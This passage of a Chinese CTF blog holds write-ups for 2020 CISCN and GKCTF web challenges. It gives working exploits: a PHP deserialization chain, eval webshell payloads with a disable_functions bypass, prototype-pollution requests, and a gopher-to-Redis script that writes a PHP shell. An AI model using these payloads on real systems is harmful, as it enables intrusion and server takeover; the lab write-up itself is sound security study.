class="line">			joint.paste(Image.<span class="built_in">open</span>(<span class="string">&quot;img//&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;.png&quot;</span>), (col * width, row * height))</span><br><span class="line">			index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	joint.save(result)</span><br><span class="line">	Image.<span class="built_in">open</span>(result).show() </span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/11/1LopmHTJ8Gb5cxQ.png" alt="image-20200511120509584.png"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 CISCN Web</title>
    <url>/2020/08/23/2020-CISCN-Web/</url>
    <content><![CDATA[<p>划水的国赛Web</p>
<span id="more"></span>

<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p><a href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
<p>参考 <a href="http://blog.ccreater.top/">http://blog.ccreater.top/</a> wmctf 2020 webweb</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">DB</span>&#123;</span><br><span class="line">  <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Cursor</span>  <span class="title class_">implements</span> \<span class="title class_">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">DB</span>\<span class="title class_">SQL</span>&#123;</span><br><span class="line">  <span class="title class_">class</span> <span class="title class_">Mapper</span> <span class="title class_">extends</span> \<span class="title class_">DB</span>\<span class="title class_">Cursor</span>&#123;</span><br><span class="line">    <span class="title class_">protected</span></span><br><span class="line">      $<span class="title class_">props</span>=[&quot;<span class="title class_">quotekey</span>&quot;=&gt;&quot;<span class="title class_">call_user_func</span>&quot;],</span><br><span class="line">      $<span class="title class_">adhoc</span>=[&quot;<span class="title class_">phpinfo</span>&quot;=&gt;[&quot;<span class="title class_">expr</span>&quot;=&gt;&quot;&quot;]],</span><br><span class="line">      $<span class="title class_">db</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;db = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">CLI</span>&#123;</span><br><span class="line">  <span class="title class_">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="title class_">protected</span></span><br><span class="line">      $<span class="title class_">server</span>=&quot;&quot;;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\<span class="title function_ invoke__">Mapper</span>(<span class="keyword">new</span> \DB\SQL\<span class="title function_ invoke__">Mapper</span>(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;server=&amp;<span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">array</span>(<span class="title class_">new</span> \<span class="title class_">CLI</span>\<span class="title class_">WS</span>(),<span class="title class_">new</span> \<span class="title class_">CLI</span>\<span class="title class_">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>迭代使用call_user_func调用pcntl函数致使异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://eci-2zed3ztpomt9kf7xbbng.cloudeci1.ichunqiu.com/?a=call_user_func&amp;b=pcntl_wait</span><br></pre></td></tr></table></figure>



<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;trick1 !== <span class="variable language_">$this</span>-&gt;trick2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable language_">$this</span>-&gt;trick1) === <span class="title function_ invoke__">md5</span>(<span class="variable language_">$this</span>-&gt;trick2) &amp;&amp; <span class="variable language_">$this</span>-&gt;trick1 != <span class="variable language_">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>弱类型判断绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;trick&quot;:2:&#123;s:6:&quot;trick1&quot;;i:1;s:6:&quot;trick2&quot;;d:0.9999999999999999;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><p>查看packge.json，发现set-value存在原型链污染 <a href="https://www.anquanke.com/vul/id/1715582">https://www.anquanke.com/vul/id/1715582</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;littlegame&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;private&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node ./bin/www&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;cookie-parser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;~1.4.4&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;debug&quot;</span><span class="punctuation">:</span> <span class="string">&quot;~2.6.9&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;express&quot;</span><span class="punctuation">:</span> <span class="string">&quot;~4.16.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;express-session&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.17.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;morgan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;~1.9.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;set-value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.0.0&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>在index.js找到flag接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Admin</span> = &#123;</span><br><span class="line">    <span class="string">&quot;password1&quot;</span>:process.<span class="property">env</span>.<span class="property">p1</span>,</span><br><span class="line">    <span class="string">&quot;password2&quot;</span>:process.<span class="property">env</span>.<span class="property">p2</span>,</span><br><span class="line">    <span class="string">&quot;password3&quot;</span>:process.<span class="property">env</span>.<span class="property">p3</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/DeveloperControlPanel&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// not implement</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">key</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">password</span> === <span class="literal">undefined</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">key</span>.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Admin</span>[key] === password)&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Wrong password!Are you Admin?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">...</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/Privilege&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">knight</span> === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/SpawnPoint&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">NewAttributeKey</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">NewAttributeValue</span> === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">NewAttributeKey</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">let</span> value = req.<span class="property">body</span>.<span class="property">NewAttributeValue</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="title function_">setFn</span>(req.<span class="property">session</span>.<span class="property">knight</span>, key, value);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;Let&#x27;s have a check!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>构造如下exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://eci-2ze2t1c804gx9bfude7s.cloudeci1.ichunqiu.com:8888/Privilege</span><br><span class="line">POST NewAttributeKey=__proto__.password4&amp;NewAttributeValue=tyao</span><br><span class="line"></span><br><span class="line">http://eci-2ze2t1c804gx9bfude7s.cloudeci1.ichunqiu.com:8888/DeveloperControlPanel</span><br><span class="line">POST key=password4&amp;password=tyao</span><br></pre></td></tr></table></figure>



<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>参考<a href="https://blog.csdn.net/qq_45708109/article/details/107645816">https://blog.csdn.net/qq_45708109/article/details/107645816</a></p>
<p>可以绕过的函数有很多，这里使用hex2bin</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// phpinfo</span></span><br><span class="line">?a=&#123;<span class="keyword">if</span>:<span class="title function_ invoke__">var_dump</span>((<span class="title function_ invoke__">hex2bin</span>(%<span class="number">27706870696e666</span>f%<span class="number">27</span>))())&#125;Tyao&#123;end%<span class="number">20</span><span class="keyword">if</span>&#125;</span><br><span class="line"><span class="comment">// cat /flag</span></span><br><span class="line">?a=&#123;<span class="keyword">if</span>:<span class="title function_ invoke__">var_dump</span>(((<span class="title function_ invoke__">hex2bin</span>(%<span class="number">2773797374656</span>d%<span class="number">27</span>))(%<span class="number">27</span>cat%<span class="number">20</span>/flag%<span class="number">27</span>)))&#125;Tyao&#123;end%<span class="number">20</span><span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-GKCTF-WEB</title>
    <url>/2020/05/28/2020-GKCTF-Web/</url>
    <content><![CDATA[<p>找了个时间复现了 GKCTF 的 WEB 题目</p>
<span id="more"></span>

<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><strong>代码执行</strong></p>
<p>进去给到源码，给了我们一个小马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable language_">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable language_">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure>

<p>先上一个小马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;eval($_REQUEST[kk]);&#x27;</span>);</span><br><span class="line">ZXZhbCgkX1JFUVVFU1Rba2tdKTs=</span><br></pre></td></tr></table></figure>

<p>看看 phpinfo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=phpinfo();</span><br></pre></td></tr></table></figure>

<p>绕 disable_functions</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113759.png" alt="image-20200528103728833"></p>
<p>蚁剑连上去，flag 需要 &#x2F;readflag</p>
<p>可以直接用这个绕  <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
<p>上传到 &#x2F;tmp 目录，直接包含就好</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113803.png"></p>
<p>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=include(&quot;/tmp/exploit.php&quot;);&amp;cmd=/readflag</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113808.png" alt="image-20200528105315601"></p>
<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p><strong>cve-2020-7066</strong></p>
<p>exp 在这里 <a href="https://bugs.php.net/bug.php?id=79329">https://bugs.php.net/bug.php?id=79329</a></p>
<p>直接打就好，访问 127.0.0.1 返回 hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.1%00.ctfhub.com</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164116.png" alt="image-20200528110116218"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.123%00.ctfhub.com</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164121.png" alt="image-20200528110131001"></p>
<h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p><strong>弱口令+后台geishell+提权</strong></p>
<p>参考 <a href="http://www.nctry.com/1660.html">http://www.nctry.com/1660.html</a> 后台getshell</p>
<p>我这里扔了一个冰蝎的马，连上读 &#x2F;flag</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164128.png" alt="image-20200528110926892"></p>
<p>读了个寂寞，提示日期很重要</p>
<p>上传个 <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> 读一下信息</p>
<p>在进程信息那里我们看到了 root 在执行一个 &#x2F;auto.sh</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164131.png" alt="image-20200528112105303"></p>
<p>看一下文件，这也是解释了进程为什么一直有 sleep 60 这个操作</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164137.png" alt="image-20200528112206309"></p>
<p>看一下 py 文件</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164139.png" alt="image-20200528112300934"></p>
<p>这很显然就是我们的变量劫持，看一下权限</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113824.png" alt="image-20200528112351256"></p>
<p>所以我们可以通过改写这个 py 文件提权</p>
<p>其实，这个 &#x2F;auto.sh 也是可写的，我们也可以改这个</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113826.png" alt="image-20200528112456969"></p>
<p>我这里就直接改 py 了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113829.png" alt="image-20200528113533012"></p>
<p>等个一分钟收割 flag</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113831.png" alt="image-20200528113511733"></p>
<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p><strong>内网+redis写shell</strong></p>
<p>进去源码有提示</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113834.png" alt="image-20200528113752714"></p>
<p>给到了一个 hosts 的信息</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113906.png" alt="image-20200528113904509"></p>
<p>尝试访问 localhost 被 waf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?url=http://127.0.0.1&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p>那就改成内网地址试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?url=http://173.235.100.10&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p>返回了正常页面</p>
<p>这里我们揣测出题人的思路，那应该就是让我扫内网地址，直接 bp，发现了这个比较特殊</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?url=http://173.235.100.11&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114349.png" alt="image-20200528114209680"></p>
<p>那就是让我们去扫描端口，继续 bp 扫常用端口，发现 redis 有回显</p>
<blockquote>
<p>记住要扫常用服务，不要从1开始扫，不然要很久</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?url=http://173.235.100.11:6379&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114356.png" alt="image-20200528114347813"></p>
<p>gopher 协议没有 ban，发现可以 redis 随意写 shell</p>
<blockquote>
<p>注意编码问题就好</p>
</blockquote>
<p>这里直接贴上 payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.19.221.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n\n\n&lt;?php system(&#x27;ls / -al&#x27;);system(&#x27;cat /flag&#x27;); ?&gt;\n\n\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;index.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span>,</span><br><span class="line">     <span class="string">&quot;quit&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += redis_format(x).replace(<span class="string">&quot;\r\n&quot;</span>,<span class="string">&quot;%250D%250A&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;%250A&quot;</span>).replace(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;%253f&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里我省了步骤，我是先看了 phpinfo()，发现没有 ban system()，再列一个目录，再看 flag 在哪</p>
</blockquote>
<p>上传之后回显成功</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114937.png" alt="image-20200528114934084"></p>
<p>访问内网机子就能看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?url=http://173.235.100.11&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528115043.png" alt="image-20200528115041491"></p>
<h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p><strong>nodejs</strong></p>
<p>上来给了代码和版本，直接代码审计</p>
<p>总体逻辑就是绕过这里的 waf</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">path</span> === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>))) &#123;</span><br><span class="line">      delay = <span class="title class_">Math</span>.<span class="title function_">max</span>(delay, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">next</span>(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span 